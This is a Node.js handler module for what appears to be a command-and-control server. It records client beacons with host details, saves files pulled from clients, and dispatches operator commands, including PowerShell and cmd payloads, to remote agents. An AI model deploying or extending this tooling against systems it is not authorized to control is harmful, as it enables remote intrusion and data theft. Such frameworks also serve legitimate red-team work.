const { join } = require('node:path');
const { promisify } = require('node:util');
const { mkdir, writeFile, existsSync } = require('node:fs');
const { log, logInfo, logError, logSuccess } = require('./logging');
const { getClientCommands, getServerCommands } = require('./commands');
const { sendClientCommand, showActiveClients, showClient, setClientActive, upsertClientSession } = require('./clients');
const { displayCommandOptions, displayActivePlugins, getUptime } = require('./helpers');
const { getLoadedPlugins } = require('./plugins');
const { clearServerConsole, prompt } = require('./readline');
const { startTime } = require('./server');

require('../typedef/definitions');

const mkdir_promise = promisify(mkdir);
const writeFile_promise = promisify(writeFile);

const config = require('./config');

const DOWNLOAD_PATH = join(__dirname, '../', config.path.downloads);
console.log('download path', DOWNLOAD_PATH);
/**
 * Beacon handler
 * @param {BeaconResponse} response 
 * @param {Client} client
 */
const handleBeacon = (response, client) => {
    try {
        logInfo(`\nReceived beacon from client: ${client.sessionId}`);
        const date = new Date();
        const dateOptions = { year: 'numeric', month: 'long', day: 'numeric' };
        const timeOptions = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
        const formattedDate = date.toLocaleDateString('en-US', dateOptions);
        const formattedTime = date.toLocaleTimeString('en-US', timeOptions);

        upsertClientSession(client.sessionId, {
            lastSeen: `${formattedDate} ${formattedTime}`,
            active: true,
            type: response.type,
            version: response.version,
            platform: response.platform,
            arch: response.arch, 
            osver: response.osver,
            hostname: response.hostname
        });

        prompt();
    } catch (error) {
        logError(`Error handling download response: ${error.message}`);
    }
};

/**
 * Download handler
 * @param {*} response 
 */
const handleDownloadResponse = async (response) => {
    try {
        if (!existsSync(DOWNLOAD_PATH)) {
            await mkdir_promise(DOWNLOAD_PATH);
        }
        const fileName = response.download;
        const assembledFilePath = join(DOWNLOAD_PATH, fileName);
        await writeFile_promise(assembledFilePath, Buffer.from(response.data, 'base64'));
        logSuccess(`\nFile "${fileName}" downloaded successfully to ${DOWNLOAD_PATH}`);
    } catch (error) {
        logError(`Error handling download response: ${error.message}`);
    }
};

/**
 * Default handler
 * @param {*} response
 */
const handleResponse = async (response) => {
    if (!response) {
        logError("Error: invalid response.");
        return;
    }
    // deconstruct the response response if exists;
    if (response.response) {
        response = response.response;
    }
    if (response.data) {
        let data = response.data;
        if (data.type === "Buffer") {
            // handle buffer response
            const response = Buffer.from(data.data).toString('utf8').trim();
            log(response);
        } else {
            if (typeof data !== 'string') {
                data = JSON.stringify(data);
            }
            log(data.toString('utf8').trim());
        }
    } else if (response.message) {
        logInfo(response.message);
    } else if (response.error) {
        logError(response.error);
    }
    prompt();
};

/**
 * Handles the command input for the server
 * @param {string} command 
 * @param {string[]} properties
 * @param {Interface} readline
 */
const handleCommandWithArgs = async (command, properties, readline) => {
    try {
        const clientCommands = getClientCommands();
        const serverCommands = getServerCommands();
        const loadedPlugins = getLoadedPlugins();
        let cmd = command.split(' ')[0].trim();

        if (clientCommands.includes(cmd) || serverCommands.includes(cmd)) {
            let handledByPlugin = false;

            for (const [pluginName, pluginModule] of loadedPlugins.entries()) {
                if (pluginModule.commands && pluginModule.commands[cmd]) {
                    const pluginCommand = pluginModule.commands[cmd];
                    
                    if (pluginModule.type === 'server') {
                        pluginCommand.handler(properties, readline);
                    } else if (pluginModule.type === 'client') {
                        
                        switch (pluginCommand.method) {
                            case 'payload-ps':
                                await sendClientCommand('ps', [
                                    pluginCommand.handler(properties)
                                ]);
                                break;
                            case 'payload-cmd':
                                await sendClientCommand('cmd', [
                                    pluginCommand.handler(properties)
                                ]);
                                break;
                            case 'execute':
                                command = pluginCommand.handler(properties);
                                await sendClientCommand(command, properties);
                                break;
                            default:
                        }
                    }

                    handledByPlugin = true;
                    break;
                }
            }

            if (!handledByPlugin) {
                switch (command) {
                    case 'clear':
                        clearServerConsole();
                        break;
                    case 'uptime':
                        log(getUptime(startTime));
                        break;
                    case 'set':
                        setClientActive(properties[0]);
                        break;
                    case 'plugins':
                        displayActivePlugins();
                        break;
                    case 'help':
                        displayCommandOptions();
                        break;
                    case 'client':
                        showClient();
                        break;
                    case 'clients':
                        showActiveClients();
                        break;
                    default:
                        logInfo('Invalid command. Type "help" to see available commands.');
                }
                prompt();
            }
        } else {
            logInfo('Invalid command. Type "help" to see available commands.');
            prompt();
        }
    } catch (error) {
        logError(`Exception: ${error.message}`);
    }
};

module.exports = {
    handleBeacon,
    handleResponse,
    handleDownloadResponse,
    handleCommandWithArgs
};